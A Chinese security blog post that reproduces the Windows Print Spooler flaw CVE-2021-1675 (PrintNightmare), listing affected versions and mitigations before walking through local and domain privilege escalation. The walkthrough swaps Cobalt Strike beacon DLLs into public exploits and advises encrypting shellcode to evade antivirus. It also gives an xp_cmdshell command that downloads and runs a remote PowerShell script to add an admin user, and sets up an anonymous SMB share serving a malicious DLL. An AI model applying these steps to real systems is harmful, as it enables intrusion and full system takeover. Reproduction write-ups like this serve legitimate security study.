<!-- build time:Thu Feb 09 2023 10:42:58 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/favicon.ico"><link rel="mask-icon" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/logo.svg" color=""><link rel="manifest" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/manifest.json"><meta name="msapplication-config" content="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/browserconfig.xml"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="如月专注" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="如月专注" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="如月专注" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/css/app.css?v=0.2.5"><link rel="canonical" href="http://example.com/2021/07/21/CVE-2021-1675/"><title>CVE-2021-1675(Windows Print Spooler权限提升漏洞) - 漏洞复现 | 如月专注</title><meta name="generator" content="Hexo 5.4.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CVE-2021-1675(Windows Print Spooler权限提升漏洞)</h1><div class="meta"><span class="item" title="创建时间：2021-07-21 17:52:35"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2021-07-21T17:52:35+08:00">2021-07-21</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>4.8k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>4 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">如月专注</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/ss.jpg"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/小夫1.png"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/2.png"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/5.jpg"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/36.png"></li><li class="item" data-background-image="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/4.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="分类于 漏洞复现"><span itemprop="name">漏洞复现</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2021/07/21/CVE-2021-1675/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/avatar.jpg"><meta itemprop="name" content="ruyue"><meta itemprop="description" content=", "></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="如月专注"></span><div class="body md" itemprop="articleBody"><h1 id="漏洞详情"><a class="anchor" href="#漏洞详情">#</a> 漏洞详情</h1><blockquote><h2 id="漏洞描述"><a class="anchor" href="#漏洞描述">#</a> 漏洞描述</h2></blockquote><hr><p>Microsoft 已发现并调查影响 Windows Print Spooler 的远程代码执行漏洞，并已将 CVE-2021-34527 分配给此漏洞。</p><p>当 Windows Print Spooler 服务不正确地执行特权文件操作时，存在远程执行代码漏洞风险。成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。然后攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新帐户。</p><p>攻击必须涉及调用 RpcAddPrinterDriverEx ( ) 的经过身份验证的用户。<br></p><blockquote><h2 id="影响版本"><a class="anchor" href="#影响版本">#</a> 影响版本</h2></blockquote><hr><p>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for x64-based Systems Service Pack 2<br>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)<br>Windows Server 2008 for 32-bit Systems Service Pack 2<br>Windows RT 8.1<br>Windows 8.1 for x64-based systems<br>Windows 8.1 for 32-bit systems<br>Windows 7 for x64-based Systems Service Pack 1<br>Windows 7 for 32-bit Systems Service Pack 1<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2016<br>Windows 10 Version 1607 for x64-based Systems<br>Windows 10 Version 1607 for 32-bit Systems<br>Windows 10 for x64-based Systems<br>Windows 10 for 32-bit Systems<br>Windows Server, version 20H2 (Server Core Installation)<br>Windows 10 Version 20H2 for ARM64-based Systems<br>Windows 10 Version 20H2 for 32-bit Systems<br>Windows 10 Version 20H2 for x64-based Systems<br>Windows Server, version 2004 (Server Core installation)<br>Windows 10 Version 2004 for x64-based Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 21H1 for 32-bit Systems<br>Windows 10 Version 21H1 for ARM64-based Systems<br>Windows 10 Version 21H1 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows Server 2019 (Server Core installation)<br>Windows Server 2019<br>Windows 10 Version 1809 for ARM64-based Systems<br>Windows 10 Version 1809 for x64-based Systems<br>Windows 10 Version 1809 for 32-bit Systems</p><p></p><p></p><blockquote><h2 id="exppoc"><a class="anchor" href="#exppoc">#</a> Exp&amp;Poc</h2></blockquote><hr><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lpc2FkaXRhdGltaS9DVkUtMjAyMS0xNjc1LUxQRQ==">https://github.com/yisaditatimi/CVE-2021-1675-LPE</span> (含 cobaltstrike cna 脚本)<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lpc2FkaXRhdGltaS9DVkUtMjAyMS0xNjc1LXBvd2Vyc2hlbGw=">https://github.com/yisaditatimi/CVE-2021-1675-powershell</span> (powershell 版本)</p><p></p><blockquote><h2 id="修复建议"><a class="anchor" href="#修复建议">#</a> 修复建议</h2></blockquote><hr><p>微软公司给出了针对该漏洞的缓解办法，目前正式补丁尚未发布。</p><p>确定 Print Spooler 服务是否正在运行（以域管理员身份运行）</p><p>以域管理员身份运行以下命令：</p><p>Get-Service -Name Spooler</p><p>如果 Print Spooler 正在运行或该服务未设置为禁用，请选择以下选项之一以禁用 Print Spooler 服务，或通过组策略禁用入站远程打印：</p><p>选项 1 - 禁用 Print Spooler 服务</p><p>如果禁用 Print Spooler 服务适合您的企业，请使用以下 PowerShell 命令：</p><p>Stop-Service -Name Spooler -Force</p><p>Set-Service -Name Spooler -StartupType Disabled</p><p>禁用 Print Spooler 服务会禁用本地和远程打印功能。</p><p>选项 2 - 通过组策略禁用入站远程打印</p><p>运行组策略编辑器 ( Win+R，输入 gpedit.msc，打开组策略编辑器），依次浏览到：计算机配置 / 管理模板 / 打印机</p><p>禁用 &quot;允许打印后台处理程序接受客户端连接：&quot; 策略以阻止远程攻击。</p><p>变通办法的影响：</p><p>此策略将通过阻止入站远程打印操作来阻止远程攻击。该系统将不再用作打印服务器，但仍然可以本地打印到直接连接的设备。</p><p>参考链接：</p><p><span class="exturl" data-url="aHR0cHM6Ly9tc3JjLm1pY3Jvc29mdC5jb20vdXBkYXRlLWd1aWRlL3Z1bG5lcmFiaWxpdHkvQ1ZFLTIwMjEtMzQ1Mjc=">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</span><br></p><p></p><blockquote><h2 id="免责声明"><a class="anchor" href="#免责声明">#</a> 免责声明</h2></blockquote><hr><p>请勿使用文中的技术和工具用于非法用途。用户须承担一切因自己的行为而直接或间接导致的民事或刑事法律责任。<br></p><blockquote><h1 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> 漏洞复现</h1></blockquote><blockquote><h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接</h2></blockquote><hr><p><span class="exturl" data-url="aHR0cHM6Ly80MjI5MjY3OTkuZ2l0aHViLmlvL3Bvc3RzL2MyNTdhYTQ2Lmh0bWw=">https://422926799.github.io/posts/c257aa46.html</span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZS9hcnRpY2xlL2RldGFpbHMvMTE4NjUyOTUz">https://blog.csdn.net/k8gege/article/details/118652953</span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vUmFpbmJvdnYvcC8xNDk2NjQzOC5odG1s">https://www.cnblogs.com/Rainbovv/p/14966438.html</span></p><blockquote><h2 id="本地提权利用"><a class="anchor" href="#本地提权利用">#</a> 本地提权利用</h2></blockquote><p>这里主要是利用该漏洞进行提权操作，可以提权到 system。</p><h3 id="二进制exp"><a class="anchor" href="#二进制exp">#</a> 二进制 EXP</h3><p>生成 CS 上线 dll 后，上传到目标主机，然后编译上述 CVE-2021-1675-LPE 代码中 dll 的路径 (不编译的话也成，不过需要输入参数指定 cs 的 dll 路径；若将路径写到代码中，就不需要执行参数了，自己取舍)。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/fd89a91c-ab1e-49ea-b0a5-2677c38156d5_89df3f41-c831-4440-bf83-8fa97015fd49-image.png" alt="89df3f41-c831-4440-bf83-8fa97015fd49-image.png"></p><p>生成 CS 上线 dll</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/bf696e51-e9c0-4bf1-a947-5c0152d28be3_4c0af7a2-5704-45ee-8342-f9f8e9061471-image.png" alt="4c0af7a2-5704-45ee-8342-f9f8e9061471-image.png"></p><p>修改代码路径</p><p>然后将生成的 exe，扔到目标机器运行即可。(这里加上了参数，如果做了上面的操作，不加参数也可以), 然后 CS 就会回弹一个 system 权限的会话了。<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/cb3c290e-ec60-443b-85a1-e7b2150e732e_ae7406f0-8291-4b85-acda-e6686c5fa67d-image.png" alt="ae7406f0-8291-4b85-acda-e6686c5fa67d-image.png"></p><h3 id="cs插件形式"><a class="anchor" href="#cs插件形式">#</a> CS 插件形式</h3><p>上传 CS dll 到目标机器。<br>然后将 CVE-2021-1675-LPE-RDLL.mian 代码中 111 行 dll 路径进行修改，编译生成，得到 CVE-2021-1675-LPE-RDLL.dll。<br>将该 dll 和 cna 插件放同目录，导入 cna 插件，输入命令 cve_2021_1675 即可。<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/3578aa63-8ccf-473b-9e8f-60c810056ce5_759f7bf0-19bf-4e2d-9a3f-160c4e50528c-image.png" alt="759f7bf0-19bf-4e2d-9a3f-160c4e50528c-image.png"></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/c55c0cdc-ff8a-47bc-be91-337058296353_8d3a69fd-891e-45e4-a477-047e3502df73-image.png" alt="8d3a69fd-891e-45e4-a477-047e3502df73-image.png"><br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/8bc63ea0-0b37-453b-8624-7a9f429f05f8_cae4cccd-6cc6-49d4-b724-b1fdefc8b584-image.png" alt="cae4cccd-6cc6-49d4-b724-b1fdefc8b584-image.png"><br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/7e592f23-d4ac-44bb-8076-5cc31b904803_0e290719-5c2e-4bff-a98f-e0fcffd50593-image.png" alt="0e290719-5c2e-4bff-a98f-e0fcffd50593-image.png"></p><h3 id="powershell执行"><a class="anchor" href="#powershell执行">#</a> Powershell 执行</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lpc2FkaXRhdGltaS9DVkUtMjAyMS0xNjc1LXBvd2Vyc2hlbGw=">https://github.com/yisaditatimi/CVE-2021-1675-powershell</span><br>下载上述 ps 文件，然后按照教程直接用即可。<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/be8d8c44-746b-49bf-8163-0baa1a676a01_4ab2b17b-5f58-46e3-a31f-29691f4533d2-image.png" alt="4ab2b17b-5f58-46e3-a31f-29691f4533d2-image.png"></p><h3 id="魔改上面的powershell"><a class="anchor" href="#魔改上面的powershell">#</a> 魔改上面的 powershell</h3><p>上面的 ps 是把 dll 以 base64 形式放在文件里的，运行后，将这个 dll 写到目标机器上，然后加载这个 dll，所以如果我们将这个 dll 换成 cs 的，那么是不是就能成功上线。</p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/8ea4b3d9-1ab5-485e-8de0-620cff622c10_26019590-4be7-4dbc-874a-1dc24890c956-image.png" alt="26019590-4be7-4dbc-874a-1dc24890c956-image.png"></p><p>|- 恶意 dll 以 base64 保存在 ps 脚本中 -|</p><p>因此，我们可以自己修改这里面的内容来完成我们的操作，比如完成 CS 上线，而不是添加用户。<br>首先，将 53 行那边的 if else 全删了，然后将 153 行的 base64 流改成我们的 dll 即可。<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/67fe0f40-68c6-45da-a4d8-d05cf6eb5bc0_3b1fb29b-d93d-474e-9fad-81704f9dbe17-image.png" alt="3b1fb29b-d93d-474e-9fad-81704f9dbe17-image.png"></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/59062d44-9ec7-499f-a5e1-2ed3e877a557_4bfab1d0-4a83-42f7-bc61-d4e62b29a1ec-image.png" alt="4bfab1d0-4a83-42f7-bc61-d4e62b29a1ec-image.png"></p><p>而这里 dll base64 流的生成如下:<br>cs 生成 dll 后，进行 gzip 压缩，然后将文件转成 base64 流，复制粘贴到 ps 脚本中。<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/1aed5b1c-992a-45b7-bd53-fe2436380181_7c49a7d7-c208-4236-8b5f-ada9b7ce5b22-image.png" alt="7c49a7d7-c208-4236-8b5f-ada9b7ce5b22-image.png"><br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/f5d2b4ba-c329-470e-8318-3e2823fe51c7_f2fad892-4a78-419e-84f4-e7c91e56d82f-image.png" alt="f2fad892-4a78-419e-84f4-e7c91e56d82f-image.png"><br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/bf95fc3e-5466-4230-b165-e466faecbe6d_305689f6-6db1-4501-875c-921e69508ef3-image.png" alt="305689f6-6db1-4501-875c-921e69508ef3-image.png"></p><h3 id="免杀dll"><a class="anchor" href="#免杀dll">#</a> 免杀 dll</h3><p>上述两种 exp 的利用，其实都是把 dll 给放到了目标机器上，存在文件落地行为，而我们使用的都是 cs 生成的 dll，因此若存在杀软，则 dll 基本上就是落地死，exp 也会因找不到 dll 而利用失败。<br>有能力的可以自己来编写免杀 dll 上线。</p><p>新建 dll 项目，删除无关代码，填充我们的功能代码。<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/0a91608c-680b-4d57-9fc0-87d696e38d88_b0f55f47-40d3-4b92-ad85-5374ff656cb4-image.png" alt="b0f55f47-40d3-4b92-ad85-5374ff656cb4-image.png"><br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/ac9921c7-4ec0-49c5-8d67-1d7dd4b0bd96_830b3efd-7695-4490-8716-5f3ed5fefa2a-image.png" alt="830b3efd-7695-4490-8716-5f3ed5fefa2a-image.png"></p><p>PS：不推荐异或免杀，推荐使用 AES 等对称加密算法来加密 shellcode。做免杀的时候务必关闭杀软的样本上传功能 (血的教训)。</p><h3 id="小技巧"><a class="anchor" href="#小技巧">#</a> 小技巧</h3><p>平时我们打战一般都是从注入打进去的，而若目标数据库是 sqlserver 的，就能通过 xp_cmdshell 来执行命令。所以我们也可以用 xp_cmdshell 来调用 powershell 执行 EXP 来进行提权（或上线 CS）。<br>将 ps1 直接传到服务器，然后执行下述命令。<br>（这里 ps 功能是添加用户，也可以按照前面的操作，把添加用户的 dll 换成 cs 上线的 dll）<br><code>exec master..xp_cmdshell 'powershell IEX ((new-object net.webclient).downloadstring(''http://1.1.1.1/add_user.ps1''));Invoke-Nightmare -DriverName PrintMe -NewUser 2025 -NewPassword qq1234.1';</code></p><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/d01d81a3-9d4f-4d38-8e93-3e6add73cd7b_078a5069-d83f-4a31-81fb-a5214e7421e0-image.png" alt="078a5069-d83f-4a31-81fb-a5214e7421e0-image.png"><br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/3a547738-39e2-4437-9828-e62eca840d35_62b54af6-3390-4398-ba55-4299cd6cb3b7-image.png" alt="62b54af6-3390-4398-ba55-4299cd6cb3b7-image.png"></p><h2 id="域提权利用"><a class="anchor" href="#域提权利用">#</a> <strong>域提权利用</strong></h2><p>前提：<br>一个普通的域用户<br>开启 PrintSpooler 服务</p><p>exp:<br>一个是 py，一个是 exe<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N1YmUweDAvQ1ZFLTIwMjEtMTY3NQ==">https://github.com/cube0x0/CVE-2021-1675</span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hheWFzZWMvUHJpbnROaWdodG1hcmU=">https://github.com/hayasec/PrintNightmare</span></p><p>下面以 py 版本的 EXP 为例，<br>为了域控能访问加载 dll 我们的恶意 dll，需要先配置一个匿名的 SMB 文件共享服务器</p><h3 id="kali下配置匿名smb共享服务器"><a class="anchor" href="#kali下配置匿名smb共享服务器">#</a> kali 下配置匿名 SMB 共享服务器</h3><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">vim</span> /etc/samba/smb.conf</pre></td></tr></table></figure><pre><code>[global]
workgroup = WORKGROUP
server string = Samba Server
netbios name = MYSERVER
log file = /var/log/samba/log.%m
max log size = 50
security = user
map to guest = Bad User
[smb]
comment = Template Directories
browseable = yes
writeable = yes
path = /tmp/
guest ok = yes     
</code></pre><p><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/41a6b3a2-4f53-4ce0-aa6d-e0003cd9a8bc_1844b777-eb91-44b0-a62c-9f4bb62cfbd3-image.png" alt="1844b777-eb91-44b0-a62c-9f4bb62cfbd3-image.png"></p><p>启动 SMB 服务<br>service smbd start<br>查看是否能正常读文件<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/1999cf14-f34a-478d-a41a-1696a9115cc6_6b26256b-aca8-439d-841e-eb49fe8cf701-image.png" alt="6b26256b-aca8-439d-841e-eb49fe8cf701-image.png"><br>若能访问目录但是无法读写文件，则说明文件无权限，需要到 kali 给予权限。如下图，赋予权限后，文件正常读写能进行。然后把我们 cs 生成的 dll 扔进共享文件夹，赋予权限，使用 exp 直接开打。<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/b4e61628-f06f-4db3-ad3e-352b6a358470_7f96d8e5-94d1-4c90-a9d9-5b8e35845d59-image.png" alt="7f96d8e5-94d1-4c90-a9d9-5b8e35845d59-image.png"><br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/d301f405-b393-49f5-b4e5-3fbd8d5ace32_a4d122c0-814a-4d0b-b62a-76ac10283faa-image.png" alt="a4d122c0-814a-4d0b-b62a-76ac10283faa-image.png"></p><h3 id="exp利用"><a class="anchor" href="#exp利用">#</a> EXP 利用</h3><p>对于 Windowserver2012 的利用未成功。（这里第一个报错是因为 lisi 没有<br>SeImpersonatePrivilege 身份验证后模拟客户端或 SeAssignPrimaryTokenPrivilege 权限)<br>于是换上域管来登录，但是不知为何，就是利用失败。（难道是必须要用普通用户，但是我普通用户又没上述权限，有环境的老哥可以试试）<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/1bd26e6b-8b0e-4f24-8fa7-7824add6a77b_ed2bbf02-28db-4881-bb14-90db4572294e-image.png" alt="ed2bbf02-28db-4881-bb14-90db4572294e-image.png"><br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/52d0c088-dfec-4817-865d-57ce29d4fd96_69abf130-4101-4f45-b6a3-a41f63ddaf87-image.png" alt="69abf130-4101-4f45-b6a3-a41f63ddaf87-image.png"></p><p>于是换成 Windows Server2019，成功攻击。（该 dll 功能是添加一个管理员用户）<br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/1188efc7-d217-49c7-8f1b-5b7579bd9c1b_23768584-61fd-4663-b160-ffad0d429dc4-image.png" alt="23768584-61fd-4663-b160-ffad0d429dc4-image.png"><br><img data-src="https://ruyue-1258558004.cos.ap-guangzhou.myqcloud.com/note/94ffea5d-96b6-4700-8cb8-f5eebc5cc807_bfc76683-bee4-4bf2-8749-b443a66268bd-image.png" alt="bfc76683-bee4-4bf2-8749-b443a66268bd-image.png"></p></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2022-06-30 19:57:23" itemprop="dateModified" datetime="2022-06-30T19:57:23+08:00">2022-06-30</time> </span><span id="2021/07/21/CVE-2021-1675/" class="item leancloud_visitors" data-flag-title="CVE-2021-1675(Windows Print Spooler权限提升漏洞)" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>ruyue <i class="ic i-at"><em>@</em></i>如月专注</li><li class="link"><strong>本文链接：</strong> <a href="http://example.com/2021/07/21/CVE-2021-1675/" title="CVE-2021-1675(Windows Print Spooler权限提升漏洞)">http://example.com/2021/07/21/CVE-2021-1675/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2021/01/04/Vlunstack2/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;ruyue-1258558004.cos.ap-guangzhou.myqcloud.com&#x2F;note&#x2F;36.png" title="Vlunsatck2"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> Vlunstack</span><h3>Vlunsatck2</h3></a></div><div class="item right"><a href="/2021/07/26/Windows%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;ruyue-1258558004.cos.ap-guangzhou.myqcloud.com&#x2F;note&#x2F;tr.jpg" title="Windows抓取密码"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> Windows安全</span><h3>Windows抓取密码</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-number">1.</span> <span class="toc-text">漏洞详情</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exppoc"><span class="toc-number">1.3.</span> <span class="toc-text">Exp&amp;Poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="toc-number">1.5.</span> <span class="toc-text">免责声明</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.1.</span> <span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">本地提权利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6exp"><span class="toc-number">2.2.1.</span> <span class="toc-text">二进制 EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E6%8F%92%E4%BB%B6%E5%BD%A2%E5%BC%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">CS 插件形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E6%89%A7%E8%A1%8C"><span class="toc-number">2.2.3.</span> <span class="toc-text">Powershell 执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%94%B9%E4%B8%8A%E9%9D%A2%E7%9A%84powershell"><span class="toc-number">2.2.4.</span> <span class="toc-text">魔改上面的 powershell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80dll"><span class="toc-number">2.2.5.</span> <span class="toc-text">免杀 dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">2.2.6.</span> <span class="toc-text">小技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">域提权利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kali%E4%B8%8B%E9%85%8D%E7%BD%AE%E5%8C%BF%E5%90%8Dsmb%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">2.3.1.</span> <span class="toc-text">kali 下配置匿名 SMB 共享服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.2.</span> <span class="toc-text">EXP 利用</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/2021/07/21/CVE-2021-1675/" rel="bookmark" 